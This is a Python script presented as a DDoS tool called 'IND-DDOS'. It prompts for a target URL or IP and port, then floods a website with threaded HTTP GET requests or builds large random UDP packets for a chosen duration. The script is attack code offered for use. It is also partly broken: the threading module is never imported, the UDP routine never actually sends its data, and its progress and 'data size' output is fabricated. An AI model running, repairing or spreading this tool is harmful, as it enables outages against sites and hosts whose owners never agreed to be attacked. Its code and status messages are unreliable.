try:
    import subprocess as sbc, sys
    import requests as r
    from colorama import Fore, Back
except:
    sbc.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])

from colorama import Fore, Back
import os
import random
import time
import socket

let = ["Up","Up","Down"]
os.system("clear")    
#!bin/python
banner = f"""
{Fore.RED}II  DDDDD   NNNN    NN           DDDD    DDDD     /OOOOO\    SSSSSS
II  DD  DD  NN NN   NN           DD  DD  DD  DD  OO     OO  S
II  DD  DD  NN  NN  NN  #######  DD  DD  DD  DD  OO     OO   SSSSS 
{Fore.WHITE}II  DD  DD  NN   NN NN           DD  DD  DD  DD  OO     OO        S
II  DDDDD   NN    NNNN           DDDD    DDDD    \OOOOOO/   SSSSSS    {Fore.BLACK}{Back.WHITE}V0.1s{Back.RESET}
""" 
print(banner)
print("\n")
print(f"""
{Fore.RED}Select METHODS

[1] HTTP = For Website
[2] SOCKET = For IP Address
""")
type = int(input(">> "))
os.system("clear")
if type == 1:
    print(banner)
    print("\n")
    Links = input(f"{Fore.GREEN}Url With (http Or https)>")
    timer = int(input(f"{Fore.RED}Time (Example=5000)>"))
    threadSend = int(input(f"{Fore.YELLOW}Thread SEND (DEFAULT=135)>"))
    times = time.time()
    os.system("clear")
    def ddosData():
        kit = random.randint(1, threadSend)
        dos = r.get(Links)
        if dos.status_code == 200:
            print(f"{Fore.GREEN}Status Code [200] ^[{Fore.BLUE}{kit}Kb{Fore.GREEN}]")
        elif (dos.status_code == 501)or (dos.status_code == 501)or (dos.status_code == 401):
            print(f"{Fore.RED}Status Code [{dos.status_code}] v{Fore.YELLOW}[{kit}Byte{Fore.RED}]")
            
    while time.time() - times < timer:
        thread = threading.Thread(target=ddosData)
        thread.start()
elif type == 2:
    print(banner)
    print("\n")
    IP = input(f"{Fore.YELLOW}IP>")
    PORT = int(input(f"{Fore.GREEN}PORT>"))
    timer = int(input(f"{Fore.RED}Time (Example=5000)>"))
    sender = int(input(f"{Fore.BLUE}Bot Send (Example=50)>"))
    size = 0
    times = time.time()
    os.system("clear")
    for x in range(sender):
        size += 1
        timed = random.randint(1, 3)
        print(f"{Fore.MAGENTA}Wait.. Making Data {Fore.BLUE}[{size}]")
        time.sleep(timed)
        os.system("clear")
        if size == sender:
            os.system("clear")
            def sock():
                dataS = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                byte = os.urandom(65000)
                 
            while time.time() - times < timer:
                data = random.randint(0, 128)
                updown = random.choice(let)
                sock()
                print(f"{Fore.BLUE}Data Size [{data}Kb] {Fore.MAGENTA}---> [{updown}]")
